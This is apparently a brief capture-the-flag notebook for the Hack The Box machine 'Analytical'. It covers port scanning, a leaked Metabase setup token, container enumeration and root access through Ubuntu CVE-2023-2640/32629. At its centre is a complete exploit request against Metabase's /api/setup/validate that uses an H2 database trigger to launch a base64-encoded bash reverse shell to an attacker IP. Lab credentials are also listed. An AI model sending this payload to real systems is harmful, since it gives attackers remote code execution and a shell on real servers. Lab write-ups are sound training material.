# Analytical -htb(Compi)

Nmap:
	22, 80

found subdomains --> data.analytics.htb

dirbuster res:
	/api/session/properties
	/

	setup-token	"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"

	bash encoded reverse shell
	YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjM0LzY2NjYgMD4mMQ==

toDo :
	url encode the " == "
	use another layer of {} around the bash call


The payload 
header 

POST /api/setup/validate

{

    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjM0LzY2NjYgMD4mMQ%3D%3D}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "x",
        "engine": "h2"
    }
}

----
Got shell access (foothold granted)
now SHELL ENUM:
--

found a .dockerenv : that means i am inside a docker container.
Have to breakout of it somehow.

Ran linpeas.sh

type `printenv` , it will list out enviroment variables and there u can get ssh usernam nad pass.
META_USER=metalytics
META_PASS=An4lytics_ds20223#

gg

----
PRIV ESC:
--

There was a public exploit cve danger that lead me priv esc:

Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629)
reddit link will point to the correct path.

GOT ROOT
